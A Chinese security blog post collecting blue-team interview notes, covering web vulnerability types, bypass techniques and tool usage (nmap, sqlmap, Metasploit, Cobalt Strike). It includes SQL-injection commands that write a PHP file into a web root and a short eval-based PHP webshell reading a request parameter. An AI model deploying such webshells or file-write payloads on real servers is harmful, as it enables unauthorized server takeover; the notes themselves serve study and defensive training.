href="#fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.7.4.2.</span> <span class="nav-text">fastjson不出网利用链</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shiro"><span class="nav-number">3.7.5.</span> <span class="nav-text">shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.7.5.1.</span> <span class="nav-text">shiro反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#weblogic"><span class="nav-number">3.7.6.</span> <span class="nav-text">weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.7.6.1.</span> <span class="nav-text">weblogic反序列化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="nav-number">3.8.</span> <span class="nav-text">常见安全设备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9FIPS"><span class="nav-number">3.8.1.</span> <span class="nav-text">入侵检测系统IPS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIDS"><span class="nav-number">3.8.2.</span> <span class="nav-text">入侵防御系统IDS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">3.8.3.</span> <span class="nav-text">防火墙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%A1%E5%9E%92%E6%9C%BA"><span class="nav-number">3.8.4.</span> <span class="nav-text">堡垒机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E5%B9%B3%E5%8F%B0"><span class="nav-number">3.8.5.</span> <span class="nav-text">态势感知平台</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.8.6.</span> <span class="nav-text">终端安全管理系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAF"><span class="nav-number">3.8.7.</span> <span class="nav-text">WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WAF%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">3.8.7.1.</span> <span class="nav-text">WAF的分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WAF%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">3.8.7.2.</span> <span class="nav-text">WAF的原理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%9C%9C%E7%BD%90"><span class="nav-number">3.8.8.</span> <span class="nav-text">蜜罐</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96-1"><span class="nav-number">3.9.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%94%BB%E5%87%BB%E6%98%AF%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E7%9A%84"><span class="nav-number">3.9.1.</span> <span class="nav-text">如何判断攻击是通过什么漏洞攻击的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%A4%E6%96%AD"><span class="nav-number">3.9.2.</span> <span class="nav-text">挖矿病毒判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="nav-number">3.9.3.</span> <span class="nav-text">清除挖矿木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%A8%E9%A9%AC%E9%A9%BB%E7%95%99%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">3.9.4.</span> <span class="nav-text">木马驻留系统的方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B%E6%83%85%E5%86%B5"><span class="nav-number">3.9.5.</span> <span class="nav-text">查看异常端口进程情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8webshell"><span class="nav-number">3.9.6.</span> <span class="nav-text">如何查看网站是否存在webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8webshell%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%EF%BC%88%E7%BD%91%E7%AB%99%E8%A2%AB%E4%B8%8A%E4%BC%A0webshell%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%EF%BC%89"><span class="nav-number">3.9.7.</span> <span class="nav-text">服务器存在webshell如何处理（网站被上传webshell如何处理）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.9.8.</span> <span class="nav-text">常见端口漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84%E6%97%A5%E5%BF%97%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90"><span class="nav-number">3.9.9.</span> <span class="nav-text">给你一个比较大的日志，应该如何分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%92%8CLinux%E7%9A%84%E6%97%A5%E5%BF%97%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE"><span class="nav-number">3.9.10.</span> <span class="nav-text">Windows和Linux的日志存放位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-number">3.9.11.</span> <span class="nav-text">常见中间件的配置文件路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84waf"><span class="nav-number">3.9.12.</span> <span class="nav-text">常见的waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#waf%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">3.9.13.</span> <span class="nav-text">waf有哪些防护方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">3.9.14.</span> <span class="nav-text">Java中常见的关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.9.15.</span> <span class="nav-text">Java中常见框架漏洞使用的协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84OA%E7%B3%BB%E7%BB%9F"><span class="nav-number">3.9.16.</span> <span class="nav-text">常见的OA系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF%E6%80%8E%E4%B9%88%E7%BB%93%E5%90%88Redis%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.9.17.</span> <span class="nav-text">SSRF怎么结合Redis相关漏洞利用</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="柷澂"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">柷澂</p>
  <div class="site-description" itemprop="description">心如明镜台，时时勤拂拭</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/monkeyx1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monkeyx1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:647498949@qq.com" title="E-Mail → mailto:647498949@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="柷澂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="柷澂">
      <meta itemprop="description" content="心如明镜台，时时勤拂拭">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="hvv常考面试题-蓝队 | 柷澂">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hvv常考面试题-蓝队
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-06-17 19:51:35" itemprop="dateCreated datePublished" datetime="2023-06-17T19:51:35+08:00">2023-06-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-07-28 01:31:00" itemprop="dateModified" datetime="2024-07-28T01:31:00+08:00">2024-07-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
        </span>
    </span>

  
    <span id="/2023/06/17/hvv%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%93%9D%E9%98%9F/" class="post-meta-item leancloud_visitors" data-flag-title="hvv常考面试题-蓝队" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="leancloud-visitors-count"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>20k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>18 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h2><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>用户输入的数据被当做SQL语句执行。</p>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>联合注入、报错注入、布尔盲注、时间盲注、宽字节注入、二次注入</p>
<h5 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h5><p>updatexml、extravalue、exp、floor</p>
<h5 id="SQL注入常见绕过"><a href="#SQL注入常见绕过" class="headerlink" title="SQL注入常见绕过"></a>SQL注入常见绕过</h5><ol>
<li>异或绕过</li>
<li>内联注释绕过</li>
<li>双写绕过</li>
<li>关键字替换绕过</li>
<li>编码绕过</li>
</ol>
<h5 id="SQL注入getshell的方式"><a href="#SQL注入getshell的方式" class="headerlink" title="SQL注入getshell的方式"></a>SQL注入getshell的方式</h5><ol>
<li>outfile写shell：select ‘<?php phpinfo(); ?>‘ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’</li>
<li>dumpfile写shell：select ‘<?php phpinfo(); ?>‘ into dumpfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php’</li>
<li>基于日志写shell：<ol>
<li>查看日志是否开启：show variable like ‘%general%’;</li>
<li>开启日志监测：set global general_log&#x3D;on;</li>
<li>设置日志路径：set global general_log_file&#x3D;’&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’;</li>
<li>执行查询，写入shell：select ‘<?php phpinfo(); ?>‘;</li>
</ol>
</li>
</ol>
<h5 id="SQL注入写shell的条件"><a href="#SQL注入写shell的条件" class="headerlink" title="SQL注入写shell的条件"></a>SQL注入写shell的条件</h5><ol>
<li>web目录具有写权限</li>
<li>知道web网站的绝对路径</li>
<li>secure_file_priv没有具体值</li>
<li>GPC关闭或者单引号没有被过滤</li>
</ol>
<h5 id="outfile和dumpfile的区别"><a href="#outfile和dumpfile的区别" class="headerlink" title="outfile和dumpfile的区别"></a>outfile和dumpfile的区别</h5><ol>
<li>outfile：(1)支持多行数据同时导出；(2)使用union联合查询时，要保证两侧查询的列数相同；(3)会在换行符制表符后面追加反斜杠</li>
<li>dumpfile：(1)每次只能导出一行数据；(2)不会在换行符制表符后面追加反斜杠</li>
</ol>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>用户输入的数据被当做html或JS代码执行。</p>
<h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>反射型、存储型、DOM型。</p>
<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>又称为XML外部实体注入，当应用程序允许引用外部实体，但是没有对用户输入的数据进行严格的过滤和限制，攻击者就可以通过构造语句，来实现任意文件读取、代码执行等攻击。</p>
<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>在存在上传点的地方，开发者没有对用户上传的文件类型以及 文件内容进行严格的过滤和限制，攻击者可以通过上传脚本文件，获取目标主机的权限，实现对目标主机的控制。</p>
<h5 id="webshell常见绕过"><a href="#webshell常见绕过" class="headerlink" title="webshell常见绕过"></a>webshell常见绕过</h5><ol>
<li><p>类实例化绕过：创建一个类，使用__construct魔术方法来触发木马（因为该方法会在被实例化的时候触发）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">create</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>(<span class="variable">$shell</span>)&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">create</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>异或绕过</p>
</li>
<li><p>关键字拼接绕过</p>
</li>
<li><p>取反绕过</p>
</li>
</ol>
<h5 id="文件上传常见绕过"><a href="#文件上传常见绕过" class="headerlink" title="文件上传常见绕过"></a>文件上传常见绕过</h5><ol>
<li>MIME绕过</li>
<li>前端绕过</li>
<li>条件竞争</li>
<li>图片马绕过</li>
<li>后缀名替换绕过</li>
</ol>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>攻击者利用目标用户的身份，来执行非法操作。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>由于服务端提供了从其他服务器应用获取数据的功能，但是没有对目标地址做严格的过滤和限制，攻击者通过篡改请求发送给服务器，然后以服务器的身份来访问其他资源，可以实现窃取本地和内网敏感数据、内网探测等攻击。</p>
<p>是一种由攻击者构造形成，由服务器发起请求的一个安全漏洞，一般情况下SSRF攻击的是外网访问不到的内部系统。</p>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><h5 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h5><p>有时候开发者为了方便引用文件，会将文件包含的代码写成一个变量，并且这个变量由前端传入，如果没有进行严格的过滤和限制，就会引发文件包含漏洞，从而执行恶意操作。</p>
<h5 id="文件包含漏洞常用的伪协议"><a href="#文件包含漏洞常用的伪协议" class="headerlink" title="文件包含漏洞常用的伪协议"></a>文件包含漏洞常用的伪协议</h5><ol>
<li>php:&#x2F;&#x2F;filter：读取文件源码</li>
<li>php:&#x2F;&#x2F;input：任意代码执行</li>
<li>data:&#x2F;&#x2F;text&#x2F;plain：任意后门执行</li>
<li>zip:&#x2F;&#x2F;：配合文件上传开启后门</li>
<li>file：读取任意文件</li>
</ol>
<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h5><p>应用程序在调用一些能够将字符串转换为代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。</p>
<h5 id="常见代码执行漏洞函数"><a href="#常见代码执行漏洞函数" class="headerlink" title="常见代码执行漏洞函数"></a>常见代码执行漏洞函数</h5><p>eval、assert、preg_replace、create_function、array_map、call_user_func、call_user_func_array、array_filter、usort、uasort</p>
<h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><h5 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h5><p>当用户可以控制命令执行函数中的参数时，将恶意系统命令掺杂到正常系统命令中，就可能造成命令执行攻击。</p>
<h5 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h5><p>system、exec、shell_exec、popen、反引号、pcntl_exec、passthru、prco_open</p>
<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h5><p>程序在处理数据时，对反序列化类型的数据没有进行足够的验证和过滤，导致攻击者可以通过构造恶意数据触发程序解析并执行攻击者预设的代码，从而实现对程序的控制。</p>
<h5 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h5><p>序列化就是将对象转换为字节流的过程，反序列化就是将字节流转换为对象的过程。</p>
<h5 id="常见的反序列化魔法函数"><a href="#常见的反序列化魔法函数" class="headerlink" title="常见的反序列化魔法函数"></a>常见的反序列化魔法函数</h5><ol>
<li>__invoke：当一个对象被当做函数调用时，会调用该方法</li>
<li>__construct：当一个对象被实例化时会调用该方法</li>
<li>__toString：当一个对象被当做字符串调用或输出时会调用该方法</li>
<li>__wakeup：当序列化时自动调用</li>
<li>__get：访问私有变量或不存在的变量时，自动回调</li>
<li>__destruct：对象销毁时调用</li>
<li>__sleep：序列化时会使对象休眠，调用sleep</li>
<li>__call：当调用的对象不存在时自动调用该方法</li>
<li>__isset：在不可访问的属性上调用isset函数或者empty函数触发</li>
<li>__unset：在不可访问的属性上调用unset函数时触发</li>
<li>__set：可以用于私有成员属性设置值，给一个未定义的属性赋值时会被触发</li>
<li>__clone：当对象复制完成时调用</li>
</ol>
<h5 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java反序列化就是将java对象转化为字节序列的过程。反序列化的过程就是</span><br><span class="line">    1. 创建一个对象输出流</span><br><span class="line">    2. 通过对象输出流的ReadObject()方法来读取对象</span><br></pre></td></tr></table></figure>

<h4 id="任意文件操作"><a href="#任意文件操作" class="headerlink" title="任意文件操作"></a>任意文件操作</h4><h5 id="任意文件读取和任意文件下载原理"><a href="#任意文件读取和任意文件下载原理" class="headerlink" title="任意文件读取和任意文件下载原理"></a>任意文件读取和任意文件下载原理</h5><p>在某些网站中，给用户提供了文件查看或者下载的功能，但是没有对用户查看或者下载的文件做限制，就可能导致任意文件下载或读取。</p>
<h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><h5 id="越权漏洞原理"><a href="#越权漏洞原理" class="headerlink" title="越权漏洞原理"></a>越权漏洞原理</h5><p>攻击者可以在获取到低权限用户后，利用一些方式绕过权限检查，访问或者操作其他用户或者高权限用户。可以分为垂直越权和水平越权。漏洞的成因是对客户端提交的数据过于信任，在程序中没有对用户的操作进行严格的权限判断，就可能导致越权漏洞。</p>
<h5 id="常见逻辑漏洞"><a href="#常见逻辑漏洞" class="headerlink" title="常见逻辑漏洞"></a>常见逻辑漏洞</h5><p>验证码绕过、越权漏洞、未授权访问。</p>
<h3 id="工具的基本使用"><a href="#工具的基本使用" class="headerlink" title="工具的基本使用"></a>工具的基本使用</h3><h4 id="nmap的基本使用"><a href="#nmap的基本使用" class="headerlink" title="nmap的基本使用"></a>nmap的基本使用</h4><ul>
<li>-sT：TCP全连接扫描，准确但是会留下大量的日志</li>
<li>-sS：TCP SYN半连接扫描，速度较快，不会留下日志</li>
<li>-sN：null扫描，标志位全为0，不适用Windows</li>
<li>-sF：FIN扫描，标志位FIN&#x3D;1，不适用Windows</li>
<li>-O：查看目标主机系统版本</li>
<li>-sV：探测服务版本</li>
<li>-A：全面扫描</li>
<li>-Pn：穿透防火墙进行扫描</li>
<li>-sC：使用nmap的默认脚本</li>
<li>--open：只显示开放的端口</li>
</ul>
<h4 id="sqlmap的基本使用"><a href="#sqlmap的基本使用" class="headerlink" title="sqlmap的基本使用"></a>sqlmap的基本使用</h4><ul>
<li>--dump：拖库</li>
<li>-u：指定URL</li>
<li>--level：注入的等级</li>
<li>--dbs：获取数据库</li>
<li>--current-db：查看当前应用程序所用数据库</li>
<li>--tables -D “数据库”：获取指定数据库的数据表名</li>
<li>--columns -T “表名” -D “库名”：获取数据库的指定数据表的字段名</li>
<li>--cookie：指定cookie</li>
<li>--os-shell：获取shell</li>
<li>--is-dba：查看是否是管理员权限</li>
<li>--data：POST提交方式</li>
<li>--forms：指定为post方式</li>
<li>-p：指定测试参数</li>
<li>--tamper：指定sqlmap的插件</li>
<li>--os-shell：获取shell权限</li>
</ul>
<h4 id="wireshark的基本使用"><a href="#wireshark的基本使用" class="headerlink" title="wireshark的基本使用"></a>wireshark的基本使用</h4><ol>
<li><p>协议 contains “关键字”：指定协议指定关键字搜索，eg：tcp contains “flag”</p>
</li>
<li><p>tcp.port&#x3D;&#x3D;”端口”：指定端口搜索</p>
</li>
<li><p>ip.addr&#x3D;&#x3D;IP地址：过滤出所有IP协议中源或目的IP等于指定IP的数据包</p>
</li>
<li><p>ip.src&#x3D;&#x3D;IP地址：表示指定源IP地址</p>
</li>
<li><p>ip.dst&#x3D;&#x3D;IP地址：表示指定目的IP地址</p>
</li>
<li><p>http.request.method：指定http请求方法</p>
</li>
<li><p>http.request：只显示http请求</p>
</li>
<li><p>http.response：只显示http响应</p>
</li>
<li><p>eth.addr&#x3D;&#x3D;Mac地址：显示所有源Mac和目的Mac地址为指定Mac地址的数据包</p>
</li>
<li><p>ip.src&#x3D;&#x3D;网段（例如：192.168.1.0&#x2F;24）：过滤一个网段</p>
</li>
</ol>
<h4 id="msf的基本使用"><a href="#msf的基本使用" class="headerlink" title="msf的基本使用"></a>msf的基本使用</h4><ul>
<li>msfdb：用来管理MSF的数据库的命令<ol>
<li>msfdb init：启动并初始化数据库</li>
<li>msfdb reinit：删除并重新初始化数据库</li>
<li>msfdb delete：删除数据库并停止使用他</li>
<li>msfdb start、stop、status：启动数据库、停止数据库、启动数据库</li>
<li>msfdb run：启动数据库并运行msfconsole</li>
</ol>
</li>
</ul>
<ol start="2">
<li>msfconsole：<ol>
<li>help?：显示某一命令的用法</li>
<li>connect：相当于nc命令</li>
<li>使用show查看msf提供的资源，常使用show exploits：查看当前可以使用的exp；show targets：查看目标；show payload：查看载荷</li>
<li>search：搜索模块。简单搜索：search ms17_010</li>
<li>show options：查看配置项；show missing：查看必配项</li>
<li>use：使用指定模块<ol>
<li>set：设置参数</li>
<li>unset：取消设置参数</li>
<li>check：检测是否有该漏洞</li>
<li>back：回到msfconsole根目录</li>
</ol>
</li>
<li>run&#x2F;exploit：开始使用模块，使用exploit -j表示在后台运行</li>
</ol>
</li>
<li>msfvenom：用于生成定制的恶意软件载荷</li>
</ol>
<h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike是一款渗透测试工具，被业界人称为CS。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可用于团队分布式协同操作。</span><br></pre></td></tr></table></figure>

<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般使用步骤就是，先启动服务端，然后启动客户端连接获得一个可视化的界面，新建监听器来接收会话，生成木马文件(常见.exe可执行文件，office宏病毒，html应用程序类型的后门文件)，上传到受害者主机，当受害者运行该木马文件时目标主机就在CS上线了。</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="Python常用的库"><a href="#Python常用的库" class="headerlink" title="Python常用的库"></a>Python常用的库</h4><ul>
<li>requests：主要用来处理http请求和处理响应</li>
<li>threading：多线程库</li>
<li>time：时间库</li>
<li>re：正则表达式</li>
<li>itertools：主要用来生成字典</li>
<li>execjs：生成加密的密码字典</li>
<li>BeautifulSoup：爬虫库</li>
</ul>
<h4 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h4><blockquote>
<p>如何识别CDN</p>
</blockquote>
